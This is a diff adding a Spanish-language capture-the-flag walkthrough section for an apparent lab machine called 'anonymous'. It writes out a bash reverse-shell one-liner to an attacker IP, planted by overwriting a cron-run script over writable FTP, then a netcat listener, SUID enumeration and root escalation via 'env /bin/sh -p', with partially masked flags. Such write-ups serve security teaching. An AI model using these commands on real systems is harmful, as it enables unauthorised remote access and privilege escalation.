@@ -230,6 +230,73 @@ Como tenemos permiso de escritura en la carpeta scripts vamos a subir un fichero
 
 ## Obtenemos Reverse Shell
 
+-Creamos un fichero clean.sh con el siguiente contenido.
 
-
+    ┌──(root㉿kali)-[/home/…/Desktop/ctf/anonymous/script]
+    └─# echo -n "bash -c 'bash -i >& /dev/tcp/10.9.92.151/1988 0>&1'" > clean.sh
     
+-Nos ponemos en escucha con netcat en nuestra maquina
+
+    ┌──(root㉿kali)-[/home/…/Desktop/ctf/anonymous/script]
+    ┌──(root㉿kali)-[/home/…/Desktop/ctf/anonymous/script]
+    └─# nc -lnvp 1988
+    listening on [any] 1988 ...
+
+-Subimos nuestra revershell al ftp al mismo directorio, por lo que sobreescribira el clean.sh(original) por el nuestro
+
+    ftp> cd scripts
+    250 Directory successfully changed.
+    
+    ftp> put /home/kali/Desktop/ctf/anonymous/script/clean.sh clean.sh
+    local: /home/kali/Desktop/ctf/anonymous/script/clean.sh remote: clean.sh
+    229 Entering Extended Passive Mode (|||46955|)
+    150 Ok to send data.
+    100% |*********************************************************************************************************************************|    51        1.10 MiB/s    00:00 ETA
+    226 Transfer complete.
+    51 bytes sent in 00:00 (0.43 KiB/s)
+
+obtenemos shell, upgradeamos a full tty para tener mejor maniobrabilidad ---> Info upgrade https://0xffsec.com/handbook/shells/full-tty/
+
+    ┌──(root㉿kali)-[/home/…/Desktop/ctf/anonymous/script]
+    └─# nc -lnvp 1988
+    listening on [any] 1988 ...
+    connect to [10.9.92.151] from (UNKNOWN) [10.10.40.39] 45988
+    bash: cannot set terminal process group (1726): Inappropriate ioctl for device
+    bash: no job control in this shell
+    namelessone@anonymous:~$ whoami;id
+    whoami;id
+    namelessone
+    uid=1000(namelessone) gid=1000(namelessone) groups=1000(namelessone),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
+
+## Post Explotacion Escalada de privilegios.
+
+-Obtencion de la flag user.txt
+
+    namelessone@anonymous:~$ cat user.txt 
+        90d6f99258581-------1e68748c414740
+
+-Listamos los ficheros del sistema que tengan el SUID activo para ver si podemos explotar alguno y llevar a root.
+
+    namelessone@anonymous:~$ find / -perm -4000 2>/dev/null
+    /snap/core/8268/bin/mount
+    /snap/core/8268/bin/ping
+    /snap/core/8268/bin/ping6
+    [...]
+    /usr/bin/env ---> Encontramos el comando env del cual podemos abusar para elevar privilegios
+    [...]
+
+INFO:Explicacion para explotar env ---> https://gtfobins.github.io/gtfobins/env/
+
+-Explotamos env
+
+    namelessone@anonymous:~$ env /bin/sh -p
+    # whoami
+    root
+    # cd /root
+    # ls
+    root.txt
+    # cat root.txt
+    4d930091c31-------7ed10f27999af363
+
+
+
